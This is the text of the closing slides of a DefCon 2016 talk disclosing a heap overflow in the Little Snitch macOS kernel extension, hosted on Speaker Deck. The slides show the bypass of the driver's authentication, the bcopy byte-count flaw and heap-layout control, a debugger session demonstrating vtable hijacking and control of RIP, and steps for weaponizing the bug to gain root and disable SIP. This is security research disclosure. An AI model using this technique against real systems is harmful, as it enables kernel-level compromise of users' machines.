    0 jz short leave ;buggy code method\_0x8 proc MD5Update(var\_90, r14 + 0xea, 0x10); MD5Update(var\_90, 0x8E6A3FA34C4F4B23, 0x10); MD5Final(0x0FC5C35FAA776E256, var\_90); do{ rdx = rcx; rcx = \*(int8\_t \*)(rbp + rax + 0xffffffffffffff60); rcx = rcx ^ \*(int8\_t \*)(rbx + rax); rcx = rcx & 0xff | rdx; rax = rax + 0x1; } while(rax != 0x10); if (rcx == 0x0) \*(r14 + 0xe9) = 0x1; connect to Little Snitch driver ('at\_obdev\_LSNKE') invoke method 0x4 returns 0x10 'random' bytes hash this data, with embedded salt (\x56\xe2\x76\xa7...) invoke method 0x8 to with hash to authenticate unsigned char gSalt[] = "\x56\xe2\x76\xa7\xfa\x35\x5c\xfc \x23\x4b\x4f\x4c\xa3\x3f\x6a\x8e"; 0x0? leave :( flag -> 0x1 :) authenticated; can (now) reach buggy code! set 'auth' flag
23. ### [the bug isn't exploitable!? ISSUE 0X2 kBuffer = OSMalloc(0x00000002, tag);](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_22.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! the bug isn&#39;t exploitable!? ISSUE 0X2 kBuffer =...")

    copyin(ls->buffer, kBuffer, 0x100000002); heap buffer   [size: 2 bytes] rest of heap.... 0x41 0x41 [ untouched ] only two bytes are copied!? \_bcopy(const void \*, void \*, vm\_size\_t); /\* \* Copyin/out from user/kernel \* rdi: source address \* rsi: destination address \* rdx: byte count \*/ Entry(\_bcopy) // TODO: // think about 32 bit or 64 bit byte count movl %edx,%ecx shrl $3,%ecx x86\_64/locore.s submit bug report to Apple (2013) Entry(\_bcopy) xchgq %rdi, %rsi movl %rdx,%rcx shrl $3,%rcx fixed! (OS X 10.11, 2015) $EDX/$ECX byte count (not $RDX/$RCX) 32bit :(
24. ### [mapped page unmapped page copyin(ls->buffer, kBuffer, ls->size); controlling the heap](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_23.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! mapped page unmapped page copyin(ls-&gt;buffer, kB...")

    copy ISSUE 0X3 heap buffer   [size: 2 bytes] rest of heap.... 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 panic :( Entry(\_bcopy)  RECOVERY\_SECTION RECOVER(\_bcopy\_fail) rep movsq movl %edx, %ecx andl $7, %ecx RECOVERY\_SECTION RECOVER(\_bcopy\_fail) \_bcopy\_fail: movl $(EFAULT),%eax ret 'fault toleranance' 0x100FFC 0x101000 struct lsStruct ls; ls.buffer = 0x100FFC ls.size = 0x100000002; heap buffer   [size: 2 bytes] rest of heap.... ring-0 ring-3 control exact # of bytes copied into buffer ls struct 0x41 0x41 0x41 0x41 0x41 0x41 0x41 0x41 ? ? ?
25. ### [vTable hijacking ($RIP) SUCCESS! heap buffer   [size: 2 bytes]](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_24.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! vTable hijacking ($RIP) SUCCESS! heap buffer   ...")

    C++ object [0xffffff8029a27e00] 0x41 0x41 0x4141414141414141 allocation size bytes copied # of bytes copied controls: + + attacker controlled vTable pointer (lldb) x/4xg 0xffffff8029a27e00 0xffffff8029a27e00: 0x4141414141414141 0x4141414141414141 0xffffff8029a27e10: 0x4141414141414141 0x4141414141414141 (lldb) reg read $rax rax = 0x4141414141414141 (lldb) x/i $rip -> 0xffffff8020b99fb3: ff 50 20 callq \*0x20(%rax) control of $RIP :)
26. ### [reliably exploiting a macOS heap overflow WEAPONIZING "Attacking the XNU](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_25.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! reliably exploiting a macOS heap overflow WEAPO...")

    Kernel in El Capitan" -luca todesco controlling heap layout    bypassing kALSR bypassing smap/smep payloads (!SIP, etc) "Hacking from iOS 8 to iOS 9"   -team pangu "Shooting the OS X El Capitan Kernel Like a Sniper" -liang chen/qidan he } get root 'bring' & load buggy kext exploit & disable SIP run unsigned kernel code, etc SIP/code-sign 'bypass' (buggy) kext still validly signed!
27. ### [CONCLUSIONS wrapping it up](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_26.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! CONCLUSIONS wrapping it up ")
28. ### [at least they fixed it... VENDOR RESPONSE :\ mov rbx,](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_27.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! at least they fixed it... VENDOR RESPONSE :\ mo...")

    rdi ; user struct mov edi, [rbx+8] ; size call \_OSMalloc mov rdi, [rbx] ; in buffer mov edx, [rbx+8] ; size mov rsi, rax ; out buffer call \_copyin fixed the bug    downplayed the bug didn't assign a CVE no credit (i'm ok with that) maybe talking about my exploit!? consistent size users won't patch
29. ### [free security tools & malware samples OBJECTIVE-SEE(.COM) KnockKnock BlockBlock TaskExplorer](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_28.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! free security tools &amp; malware samples OBJECTIVE...")

    Ostiarius Hijack Scanner KextViewr RansomWhere?
30. ### [contact me any time :) QUESTIONS & ANSWERS [email protected] @patrickwardle](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_29.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! contact me any time :) QUESTIONS &amp; ANSWERS patr...")

    "Is it crazy how saying sentences backwards creates backwards sentences saying how crazy it is?" -Have\_One, reddit.com final thought ;)
31. ### [mahalo :) CREDITS - FLATICON.COM - THEZOOOM.COM - ICONMONSTR.COM -](https://files.speakerdeck.com/presentations/881b7cc511b34f73a6009d4c4e3ac2ad/slide_30.jpg "[DefCon 2016] I got 99 Problems, but  Little Snitch ain’t one! mahalo :) CREDITS - FLATICON.COM - THEZOOOM.COM...")

    HTTP://WIRDOU.COM/2012/02/04/IS-THAT-BAD-DOCTOR/ - HTTP://TH07.DEVIANTART.NET/FS70/PRE/F/ 2010/206/4/4/441488BCC359B59BE409CA02F863E843.JPG     - "IOS KERNEL EXPLOITATION --- IOKIT EDITION ---" -STEFANO ESSER - "REVISITING MAC OS X KERNEL ROOTKITS!" -PEDRO VILAÇA - "FIND YOUR OWN IOS KERNEL BUG" -XU HAO/XIABO CHEN - "ATTACKING THE XNU KERNEL IN EL CAPITAN" -LUCA TODESCO - "HACKING FROM IOS 8 TO IOS 9" -TEAM PANGU - "SHOOTING THE OS X EL CAPITAN KERNEL LIKE A SNIPER" -LIANG CHEN/QIDAN HE - "OPTIMIZED FUZZING IOKIT IN IOS" -LEI LONG - "MAC OS X AND IOS INTERNALS" -JONATHAN LEVIN - "OS X AND IOS KERNEL PROGRAMMING" -OLE HALVORSEN/DOUGLAS CLARKE images resources

![](https://d1eu30co0ohy4w.cloudfront.net/assets/mark-f4be6df1e05965cac9f98e664a6c35f5ffdd0207385d07464a9214d6cdf76082.svg)
[![Speaker Deck](https://d1eu30co0ohy4w.cloudfront.net/assets/mark-f4be6df1e05965cac9f98e664a6c35f5ffdd0207385d07464a9214d6cdf76082.svg)

SpeakerDeck](/)

## Top Categories

* [Programming](/c/programming)
* [Technology](/c/technology)
* [Storyboards](/c/storyboards)
* [Featured decks](/p/featured)
* [Featured speakers](/s/featured)

## Use Cases

* [Storyboard Artists](/pro/storyboard-artists)
* [Educators](/educators)
* [Students](/student-pricing)

## Resources

* [Help Center](https://help.speakerdeck.com/)
* [Blog](https://blog.speakerdeck.com/)
* [Compare Speaker Deck](/slideshare-alternative)
* [Advertising](/advertising)

## Features

* [Private URLs](/features/privacy-controls)
* [Password Protection](/features/password-protection)
* [Custom URLS](/features/custom-urls)
* [Scheduled publishing](/features/scheduled-publishing)
* [Remove Branding](/features/remove-branding)
* [Restrict embedding](/features/restrict-embedding)
* [Notes](/features/slide-notes)

Copyright © 2025 Speaker Deck, LLC.

All slide content and descriptions are owned by their creators.

* [About](/about)
* [Terms](/tos)
* [Privacy](/privacy)
* [DMCA](/dmca)
* [Accessibility Statement](/accessibility)

![](https://www.facebook.com/tr?id=2893765844191276&ev=PageView&noscript=1)


